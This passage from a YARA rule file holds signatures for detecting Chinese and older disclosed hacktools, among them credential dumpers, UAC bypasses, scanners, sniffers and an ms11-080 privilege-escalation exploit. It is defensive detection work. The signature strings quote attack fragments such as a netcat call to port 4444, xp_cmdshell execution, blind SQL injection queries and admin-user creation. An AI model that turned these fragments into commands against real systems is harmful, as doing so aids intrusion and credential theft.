$s7 = "color: rgb(255,0,0); text-decoration: underline }" fullword ascii
$s13 = "if Request(\"creat\")<>\"yes\" then" fullword ascii
condition:
5 of them
}
rule SSC_update_PcInit {
meta:
description = "Chinese Hacktool Set - file PcInit.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "a6facc4453f8cd81b8c18b3b3004fa4d8e2f5344"
strings:
$s1 = "\\svchost.exe" fullword ascii
$s2 = "%s%08x.001" fullword ascii
$s3 = "Global\\ps%08x" fullword ascii
$s4 = "drivers\\" fullword ascii /* Goodware String - occured 2 times */
$s5 = "StrStrA" fullword ascii /* Goodware String - occured 43 times */
$s6 = "StrToIntA" fullword ascii /* Goodware String - occured 44 times */
condition:
uint16(0) == 0x5a4d and filesize < 50KB and all of them
}
rule SSC_sig_238_nbtdump {
meta:
description = "Disclosed hacktool set (old stuff) - file nbtdump.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
strings:
$s0 = "Creation of results file - \"%s\" failed." fullword ascii
$s1 = "c:\\>nbtdump remote-machine" fullword ascii
$s7 = "Cerberus NBTDUMP" fullword ascii
$s11 = "<CENTER><H1>Cerberus Internet Scanner</H1>" fullword ascii
$s18 = "<P><H3>Account Information</H3><PRE>" fullword wide
$s19 = "%s's password is %s</H3>" fullword wide
$s20 = "%s's password is blank</H3>" fullword wide
condition:
5 of them
}
rule SSC_pw_inspector {
meta:
description = "Chinese Hacktool Set - file pw-inspector.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "4f8e3e101098fc3da65ed06117b3cb73c0a66215"
strings:
$s1 = "-m MINLEN  minimum length of a valid password" fullword ascii
$s2 = "http://www.thc.org" fullword ascii
$s3 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 460KB and all of them
}
rule SSC_tools_Sqlcmd {
meta:
description = "Chinese Hacktool Set - file Sqlcmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "99d56476e539750c599f76391d717c51c4955a33"
strings:
$s0 = "[Usage]:  %s <HostName|IP> <UserName> <Password>" fullword ascii
$s1 = "=============By uhhuhy(Feb 18,2003) - http://www.cnhonker.net=============" fullword ascii /* PEStudio Blacklist: os */
$s4 = "Cool! Connected to SQL server on %s successfully!" fullword ascii
$s5 = "EXEC master..xp_cmdshell \"%s\"" fullword ascii
$s6 = "=======================Sqlcmd v0.21 For HScan v1.20=======================" fullword ascii
$s10 = "Error,exit!" fullword ascii
$s11 = "Sqlcmd>" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 40KB and 3 of them
}
rule SSC_CN_Hacktool_MilkT_Scanner {
meta:
description = "Detects a chinese Portscanner named MilkT"
author = "Florian Roth"
score = 60
date = "12.10.2014"
strings:
$s0 = "Bf **************" ascii fullword
$s1 = "forming Time: %d/" ascii
$s2 = "KERNEL32.DLL" ascii fullword
$s3 = "CRTDLL.DLL" ascii fullword
$s4 = "WS2_32.DLL" ascii fullword
$s5 = "GetProcAddress" ascii fullword
$s6 = "atoi" ascii fullword
condition:
all of them
}
rule SSC_genhash_genhash : Toolkit  {
meta:
description = "Auto-generated rule - file genhash.exe"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "113df11063f8634f0d2a28e0b0e3c2b1f952ef95bad217fd46abff189be5373f"
strings:
$s1 = "genhash.exe <password>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
$s3 = "Password: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00' */
$s4 = "%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X%.2X" fullword ascii /* score: '11.00' */
$s5 = "This tool generates LM and NT hashes." fullword ascii /* score: '10.00' */
$s6 = "(hashes format: LM Hash:NT hash)" fullword ascii /* score: '10.00' */
condition:
uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}
rule SSC_Hacktools_CN_445_cmd {
meta:
description = "Disclosed hacktool set - file cmd.bat"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "69b105a3aec3234819868c1a913772c40c6b727a"
strings:
$bat = "@echo off" fullword ascii
$s0 = "cs.exe %1" fullword ascii
$s2 = "nc %1 4444" fullword ascii
condition:
$bat at 0 and all of ($s*)
}
rule SSC_Dos_look {
meta:
description = "Chinese Hacktool Set - file look.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e1a37f31170e812185cf00a838835ee59b8f64ba"
strings:
$s1 = "<description>CHKen QQ:41901298</description>" fullword ascii
$s2 = "version=\"9.9.9.9\"" fullword ascii
$s3 = "name=\"CH.Ken.Tool\"" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 40KB and all of them
}
rule SSC_BypassUac_3 {
meta:
description = "Auto-generated rule - file BypassUacDll.dll"
author = "yarGen Yara Rule Generator"
hash = "1974aacd0ed987119999735cad8413031115ce35"
strings:
$s0 = "BypassUacDLL.dll" fullword wide
$s1 = "\\Release\\BypassUacDll" ascii
$s3 = "Win7ElevateDLL" fullword wide
$s7 = "BypassUacDLL" fullword wide
condition:
3 of them
}
rule SSC_lsadump
{
meta:
description		= "LSA dump programe (bootkey/syskey) - pwdump and others"
author			= "Benjamin DELPY (gentilkiwi)"
strings:
$str_sam_inc	= "\\Domains\\Account" ascii nocase
$str_sam_exc	= "\\Domains\\Account\\Users\\Names\\" ascii nocase
$hex_api_call	= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }
$str_msv_lsa	= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }
$hex_bkey		= { 4b 53 53 4d [20-70] 05 00 01 00}
condition:
( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )
and not uint16(0) == 0x5a4d
}
rule SSC_x64_KiwiCmd {
meta:
description = "Chinese Hacktool Set - file KiwiCmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "569ca4ff1a5ea537aefac4a04a2c588c566c6d86"
strings:
$s1 = "Process Ok, Memory Ok, resuming process :)" fullword wide
$s2 = "Kiwi Cmd no-gpo" fullword wide
$s3 = "KiwiAndCMD" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 400KB and 2 of them
}
rule SSC_aspbackdoor_entice {
meta:
description = "Disclosed hacktool set (old stuff) - file entice.asp"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
strings:
$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
$s4 = "conndb.Execute(sqllanguage)" fullword ascii
$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
condition:
all of them
}
rule SSC_S_MultiFunction_Scanners_s {
meta:
description = "Chinese Hacktool Set - file s.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "79b60ffa1c0f73b3c47e72118e0f600fcd86b355"
strings:
$s0 = "C:\\WINDOWS\\temp\\pojie.exe /l=" fullword ascii
$s1 = "C:\\WINDOWS\\temp\\s.exe" fullword ascii
$s2 = "C:\\WINDOWS\\temp\\s.exe tcp " fullword ascii
$s3 = "explorer.exe http://www.hackdos.com" fullword ascii
$s4 = "C:\\WINDOWS\\temp\\pojie.exe" fullword ascii
$s5 = "Failed to read file or invalid data in file!" fullword ascii
$s6 = "www.hackdos.com" fullword ascii
$s7 = "WTNE / MADE BY E COMPILER - WUTAO " fullword ascii
$s11 = "The interface of kernel library is invalid!" fullword ascii
$s12 = "eventvwr" fullword ascii
$s13 = "Failed to decompress data!" fullword ascii
$s14 = "NOTEPAD.EXE result.txt" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 8000KB and 4 of them
}
rule SSC_GoodToolset_ms11011 {
meta:
description = "Chinese Hacktool Set - file ms11011.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5ad7a4962acbb6b0e3b73d77385eb91feb88b386"
strings:
$s0 = "\\i386\\Hello.pdb" ascii
$s1 = "OS not supported." fullword ascii
$s3 = "Not supported." fullword wide  /* Goodware String - occured 3 times */
$s4 = "SystemDefaultEUDCFont" fullword wide  /* Goodware String - occured 18 times */
condition:
uint16(0) == 0x5a4d and filesize < 100KB and all of them
}
rule SSC_Sniffer_analyzer_SSClone_1210_full_version {
meta:
description = "Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "6882125babb60bd0a7b2f1943a40b965b7a03d4e"
strings:
$s0 = "http://www.vip80000.com/hot/index.html" fullword ascii
$s1 = "GetConnectString" fullword ascii
$s2 = "CnCerT.Safe.SSClone.dll" fullword ascii
$s3 = "(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 3580KB and all of them
}
rule SSC_hscangui {
meta:
description = "Chinese Hacktool Set - file hscangui.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "af8aced0a78e1181f4c307c78402481a589f8d07"
strings:
$s1 = "[%s]: Found \"FTP account: anyone/anyone@any.net\"  !!!" fullword ascii
$s2 = "http://www.cnhonker.com" fullword ascii
$s3 = "%s@ftpscan#Cracked account:  %s/%s" fullword ascii
$s4 = "[%s]: Found \"FTP account: %s/%s\" !!!" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}
rule SSC_Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
meta:
description = "Disclosed hacktool set (old stuff) - file Install.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "95866e917f699ee74d4735300568640ea1a05afd"
strings:
$s1 = "http://go.163.com/sdemo" fullword wide
$s2 = "Player.tmp" fullword ascii
$s3 = "Player.EXE" fullword wide
$s4 = "mailto:sdemo@263.net" fullword ascii
$s5 = "S-Player.exe" fullword ascii
$s9 = "http://www.BaiXue.net (" fullword wide
condition:
all of them
}
rule SSC_IISPutScanner {
meta:
description = "Chinese Hacktool Set - file IISPutScanner.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "9869c70d6a9ec2312c749aa17d4da362fa6e2592"
strings:
$s2 = "KERNEL32.DLL" fullword ascii
$s3 = "ADVAPI32.DLL" fullword ascii
$s4 = "VERSION.DLL" fullword ascii
$s5 = "WSOCK32.DLL" fullword ascii
$s6 = "COMCTL32.DLL" fullword ascii
$s7 = "GDI32.DLL" fullword ascii
$s8 = "SHELL32.DLL" fullword ascii
$s9 = "USER32.DLL" fullword ascii
$s10 = "OLEAUT32.DLL" fullword ascii
$s11 = "LoadLibraryA" fullword ascii
$s12 = "GetProcAddress" fullword ascii
$s13 = "VirtualProtect" fullword ascii
$s14 = "VirtualAlloc" fullword ascii
$s15 = "VirtualFree" fullword ascii
$s16 = "ExitProcess" fullword ascii
$s17 = "RegCloseKey" fullword ascii
$s18 = "GetFileVersionInfoA" fullword ascii
$s19 = "ImageList_Add" fullword ascii
$s20 = "BitBlt" fullword ascii
$s21 = "ShellExecuteA" fullword ascii
$s22 = "ActivateKeyboardLayout" fullword ascii
$s23 = "BBABORT" fullword wide
$s25 = "BBCANCEL" fullword wide
$s26 = "BBCLOSE" fullword wide
$s27 = "BBHELP" fullword wide
$s28 = "BBIGNORE" fullword wide
$s29 = "PREVIEWGLYPH" fullword wide
$s30 = "DLGTEMPLATE" fullword wide
$s31 = "TABOUTBOX" fullword wide
$s32 = "TFORM1" fullword wide
$s33 = "MAINICON" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 500KB and filesize > 350KB and all of them
}
rule SSC_dubrute : bruteforcer toolkit
{
meta:
author = "Christian Rebischke (@sh1bumi)"
date = "2015-09-05"
description = "Rules for DuBrute Bruteforcer"
in_the_wild = true
family = "Hackingtool/Bruteforcer"
strings:
$a = "WBrute"
$b = "error.txt"
$c = "good.txt"
$d = "source.txt"
$e = "bad.txt"
$f = "Generator IP@Login;Password"
condition:
//check for MZ Signature at offset 0
uint16(0) == 0x5A4D
and
//check for dubrute specific strings
$a and $b and $c and $d and $e and $f
}
rule SSC_Amplia_Security_Tool
{
meta:
description = "Amplia Security Tool"
score = 60
nodeepdive = 1
strings:
$a = "Amplia Security"
$b = "Hernan Ochoa"
$c = "getlsasrvaddr.exe"
$d = "Cannot get PID of LSASS.EXE"
$e = "extract the TGT session key"
$f = "PPWDUMP_DATA"
condition: 1 of them
}
rule SSC_HScan_v1_20_oncrpc {
meta:
description = "Chinese Hacktool Set - file oncrpc.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "e8f047eed8d4f6d2f5dbaffdd0e6e4a09c5298a2"
strings:
$s1 = "clnt_raw.c - Fatal header serialization error." fullword ascii
$s2 = "svctcp_.c - cannot getsockname or listen" fullword ascii
$s3 = "too many connections (%d), compilation constant FD_SETSIZE was only %d" fullword ascii
$s4 = "svc_run: - select failed" fullword ascii
$s5 = "@(#)bindresvport.c" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 340KB and 4 of them
}
rule SSC_CN_Toolset_NTscan_PipeCmd {
meta:
description = "Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe"
author = "Florian Roth"
reference = "http://qiannao.com/ls/905300366/33834c0c/"
reference2 = "https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar"
date = "2015/03/30"
score = 70
hash = "a931d65de66e1468fe2362f7f2e0ee546f225c4e"
strings:
$s2 = "Please Use NTCmd.exe Run This Program." fullword ascii
$s3 = "PipeCmd.exe" fullword wide
$s4 = "\\\\.\\pipe\\%s%s%d" fullword ascii
$s5 = "%s\\pipe\\%s%s%d" fullword ascii
$s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
$s7 = "%s\\ADMIN$\\System32\\%s" fullword ascii
$s9 = "PipeCmdSrv.exe" fullword ascii
$s10 = "This is a service executable! Couldn't start directly." fullword ascii
$s13 = "\\\\.\\pipe\\PipeCmd_communicaton" fullword ascii
$s14 = "PIPECMDSRV" fullword wide
$s15 = "PipeCmd Service" fullword ascii
condition:
4 of them
}
rule SSC_SQLCracker {
meta:
description = "Chinese Hacktool Set - file SQLCracker.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "1aa5755da1a9b050c4c49fc5c58fa133b8380410"
strings:
$s0 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */
$s1 = "_CIcos" fullword ascii
$s2 = "kernel32.dll" fullword ascii
$s3 = "cKmhV" fullword ascii
$s4 = "080404B0" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 125KB and all of them
}
rule SSC_cyclotron {
meta:
description = "Chinese Hacktool Set - file cyclotron.sys"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "5b63473b6dc1e5942bf07c52c31ba28f2702b246"
strings:
$s1 = "\\Device\\IDTProt" fullword wide
$s2 = "IoDeleteSymbolicLink" fullword ascii  /* Goodware String - occured 467 times */
$s3 = "\\??\\slIDTProt" fullword wide
$s4 = "IoDeleteDevice" fullword ascii  /* Goodware String - occured 993 times */
$s5 = "IoCreateSymbolicLink" fullword ascii /* Goodware String - occured 467 times */
condition:
uint16(0) == 0x5a4d and filesize < 3KB and all of them
}
rule SSC__Bitchin_Threads_ {
meta:
description = "Auto-generated rule on file =Bitchin Threads=.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "7491b138c1ee5a0d9d141fbfd1f0071b"
strings:
$s0 = "DarKPaiN"
$s1 = "=BITCHIN THREADS"
condition:
all of them
}
rule SSC_FeliksPack3___Scanners_ipscan {
meta:
description = "Auto-generated rule on file ipscan.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "6c1bcf0b1297689c8c4c12cc70996a75"
strings:
$s2 = "WCAP;}ECTED"
$s4 = "NotSupported"
$s6 = "SCAN.VERSION{_"
condition:
all of them
}
rule SSC_MarathonTool_2 {
meta:
description = "Chinese Hacktool Set - file MarathonTool.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "75b5d25cdaa6a035981e5a33198fef0117c27c9c"
strings:
$s3 = "http://localhost/retomysql/pista.aspx?id_pista=1" fullword wide
$s6 = "SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS" fullword wide
$s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}
rule SSC_splitjoin {
meta:
description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
strings:
$s0 = "Not for distribution without the authors permission" fullword wide
$s2 = "Utility to split and rejoin files.0" fullword wide
$s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
$s19 = "SplitJoin" fullword wide
condition:
all of them
}
rule SSC_Cmdshell32 {
meta:
description = "Chinese Hacktool Set - file Cmdshell32.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "3c41116d20e06dcb179e7346901c1c11cd81c596"
strings:
$s1 = "cmdshell.exe" fullword wide
$s2 = "cmdshell" fullword ascii
$s3 = "[Root@CmdShell ~]#" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 62KB and all of them
}
rule SSC_sig_238_FPipe {
meta:
description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
strings:
$s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
$s1 = "Unable to resolve hostname \"%s\"" fullword ascii
$s2 = "source port for that outbound connection being set to 53 also." fullword ascii
$s3 = " -s    - outbound source port number" fullword ascii
$s5 = "http://www.foundstone.com" fullword ascii
$s20 = "Attempting to connect to %s port %d" fullword ascii
condition:
all of them
}
rule SSC_IDTools_For_WinXP_IdtTool {
meta:
description = "Chinese Hacktool Set - file IdtTool.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ebab6e4cb7ea82c8dc1fe4154e040e241f4672c6"
strings:
$s2 = "IdtTool.sys" fullword ascii
$s4 = "Idt Tool bY tMd[CsP]" fullword wide
$s6 = "\\\\.\\slIdtTool" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 25KB and all of them
}
rule SSC_IsDebug_V1_4 {
meta:
description = "Chinese Hacktool Set - file IsDebug V1.4.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ca32474c358b4402421ece1cb31714fbb088b69a"
strings:
$s0 = "IsDebug.dll" fullword ascii
$s1 = "SV Dumper V1.0" fullword wide
$s2 = "(IsDebuggerPresent byte Patcher)" fullword ascii
$s8 = "Error WriteMemory failed" fullword ascii
$s9 = "IsDebugPresent" fullword ascii
$s10 = "idb_Autoload" fullword ascii
$s11 = "Bin Files" fullword ascii
$s12 = "MASM32 version" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 30KB and all of them
}
rule SSC_whosthere_alt_pth : Toolkit  {
meta:
description = "Auto-generated rule - file pth.dll"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "fbfc8e1bc69348721f06e96ff76ae92f3551f33ed3868808efdb670430ae8bd0"
strings:
$s0 = "c:\\debug.txt" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00' */
$s1 = "pth.dll" fullword ascii /* score: '20.00' */
$s2 = "\"Primary\" string found at %.8Xh" fullword ascii /* score: '7.00' */
$s3 = "\"Primary\" string not found!" fullword ascii /* score: '6.00' */
$s4 = "segment 1 found at %.8Xh" fullword ascii /* score: '6.00' */
condition:
uint16(0) == 0x5a4d and filesize < 240KB and 4 of them
}
rule SSC_sig_238_TELNET {
meta:
description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
strings:
$s0 = "TELNET [host [port]]" fullword wide
$s2 = "TELNET.EXE" fullword wide
$s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
$s14 = "Software\\Microsoft\\Telnet" fullword wide
condition:
all of them
}
rule SSC_iKAT_revelations {
meta:
description = "iKAT hack tool showing the content of password fields - file revelations.exe"
author = "Florian Roth"
date = "05.11.14"
score = 75
reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
strings:
$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
$s8 = "BETAsupport@snadboy.com" fullword wide
$s9 = "support@snadboy.com" fullword wide
$s14 = "RevelationHelper.dll" fullword ascii
condition:
all of them
}
rule SSC_Hacktools_CN_Panda_tesksd {
meta:
description = "Disclosed hacktool set - file tesksd.jpg"
author = "Florian Roth"
date = "17.11.14"
score = 60
hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
strings:
$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
$s1 = "ExeMiniDownload.exe" fullword wide
$s16 = "POST %Hs" fullword ascii
condition:
all of them
}
rule SSC_CN_Tools_PcShare {
meta:
description = "Chinese Hacktool Set - file PcShare.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "ee7ba9784fae413d644cdf5a093bd93b73537652"
strings:
$s0 = "title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;" fullword wide
$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
$s2 = "http://www.pcshares.cn/pcshare200/lostpass.asp" fullword wide
$s5 = "port=%s;name=%s;pass=%s;" fullword wide
$s16 = "%s\\ini\\*.dat" fullword wide
$s17 = "pcinit.exe" fullword wide
$s18 = "http://www.pcshare.cn" fullword wide
condition:
uint16(0) == 0x5a4d and filesize < 6000KB and 3 of them
}
rule SSC_LinuxHacktool_eyes_pscan2_2 {
meta:
description = "Linux hack tools - file pscan2.c"
author = "Florian Roth"
reference = "not set"
date = "2015/01/19"
hash = "eb024dfb441471af7520215807c34d105efa5fd8"
strings:
$s0 = "snprintf(outfile, sizeof(outfile) - 1, \"scan.log\", argv[1], argv[2]);" fullword ascii
$s2 = "printf(\"Usage: %s <b-block> <port> [c-block]\\n\", argv[0]);" fullword ascii
$s3 = "printf(\"\\n# pscan completed in %u seconds. (found %d ips)\\n\", (time(0) - sca" ascii
$s19 = "connlist[i].addr.sin_family = AF_INET;" fullword ascii
$s20 = "snprintf(last, sizeof(last) - 1, \"%s.%d.* (total: %d) (%.1f%% done)\"," fullword ascii
condition:
2 of them
}
rule SSC_CN_Tools_xsniff {
meta:
description = "Chinese Hacktool Set - file xsniff.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "d61d7329ac74f66245a92c4505a327c85875c577"
strings:
$s0 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
$s1 = "HOST: %s USER: %s, PASS: %s" fullword ascii
$s2 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
$s10 = "Code by glacier <glacier@xfocus.org>" fullword ascii
$s11 = "%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}
rule SSC_BypassUac2 {
meta:
description = "Auto-generated rule - file BypassUac2.zip"
author = "yarGen Yara Rule Generator"
hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
strings:
$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
condition:
all of them
}
rule SSC_sig_238_token {
meta:
description = "Disclosed hacktool set (old stuff) - file token.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
strings:
$s0 = "Logon.exe" fullword ascii
$s1 = "Domain And User:" fullword ascii
$s2 = "PID=Get Addr$(): One" fullword ascii
$s3 = "Process " fullword ascii
$s4 = "psapi.dllK" fullword ascii
condition:
all of them
}
rule SSC_GoodToolset_ms11080 {
meta:
description = "Chinese Hacktool Set - file ms11080.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "f0854c49eddf807f3a7381d3b20f9af4a3024e9f"
strings:
$s1 = "[*] command add user 90sec 90sec" fullword ascii
$s2 = "\\ms11080\\Debug\\ms11080.pdb" fullword ascii
$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
$s4 = "[*] Add to Administrators success" fullword ascii
$s5 = "[*] User has been successfully added" fullword ascii
$s6 = "[>] ms11-08 Exploit" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}
rule SSC_ms11080_withcmd {
meta:
description = "Chinese Hacktool Set - file ms11080_withcmd.exe"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "745e5058acff27b09cfd6169caf6e45097881a49"
strings:
$s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
$s2 = "\\ms11080\\ms11080\\Debug\\ms11080.pdb" fullword ascii
$s3 = "[>] by:Mer4en7y@90sec.org" fullword ascii
$s4 = "[>] create porcess error" fullword ascii
$s5 = "[>] ms11-080 Exploit" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 300KB and 1 of them
}
rule SSC_PortRacer {
meta:
description = "Auto-generated rule on file PortRacer.exe"
author = "yarGen Yara Rule Generator by Florian Roth"
hash = "2834a872a0a8da5b1be5db65dfdef388"
strings:
$s0 = "Auto Scroll BOTH Text Boxes"
$s4 = "Start/Stop Portscanning"
$s6 = "Auto Save LogFile by pressing STOP"
condition:
all of them
}
rule SSC_gina_zip_Folder_gina {
meta:
description = "Disclosed hacktool set (old stuff) - file gina.dll"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "e0429e1b59989cbab6646ba905ac312710f5ed30"
strings:
$s0 = "NEWGINA.dll" fullword ascii
$s1 = "LOADER ERROR" fullword ascii
$s3 = "WlxActivateUserShell" fullword ascii
$s6 = "WlxWkstaLockedSAS" fullword ascii
$s13 = "WlxIsLockOk" fullword ascii
$s14 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
$s16 = "WlxShutdown" fullword ascii
$s17 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
condition:
all of them
}
rule SSC_InstGina {
meta:
description = "Disclosed hacktool set (old stuff) - file InstGina.exe"
author = "Florian Roth"
date = "23.11.14"
score = 60
hash = "5317fbc39508708534246ef4241e78da41a4f31c"
strings:
$s0 = "To Open Registry" fullword ascii
$s4 = "I love Candy very much!!" ascii
$s5 = "GinaDLL" fullword ascii
condition:
all of them
}
rule SSC_update_PcMain {
meta:
description = "Chinese Hacktool Set - file PcMain.dll"
author = "Florian Roth"
reference = "http://tools.zjqhr.com/"
date = "2015-06-13"
hash = "aa68323aaec0269b0f7e697e69cce4d00a949caa"
strings:
$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322" ascii
$s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
$s2 = "SOFTWARE\\Classes\\HTTP\\shell\\open\\command" fullword ascii
$s3 = "\\svchost.exe -k " fullword ascii
$s4 = "SYSTEM\\ControlSet001\\Services\\%s" fullword ascii
$s9 = "Global\\%s-key-event" fullword ascii
$s10 = "%d%d.exe" fullword ascii
$s14 = "%d.exe" fullword ascii
$s15 = "Global\\%s-key-metux" fullword ascii
$s18 = "GET / HTTP/1.1" fullword ascii
$s19 = "\\Services\\" fullword ascii
$s20 = "qy001id=%d;qy001guid=%s" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 500KB and 4 of them
}
rule SSC_iam_alt_iam_alt : Toolkit  {
meta:
description = "Auto-generated rule - file iam-alt.exe"
author = "Florian Roth"
reference = "http://www.coresecurity.com/corelabs-research/open-source-tools/pass-hash-toolkit"
date = "2015-07-10"
score = 80
hash = "2ea662ef58142d9e340553ce50d95c1b7a405672acdfd476403a565bdd0cfb90"
strings:
$s0 = "<cmd>. Create a new logon session and run a command with the specified credentials (e.g.: -r cmd.exe)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '59.00' */
$s1 = "IAM-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com) - (c) 2007-2008 Core Security Technologies" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00' */
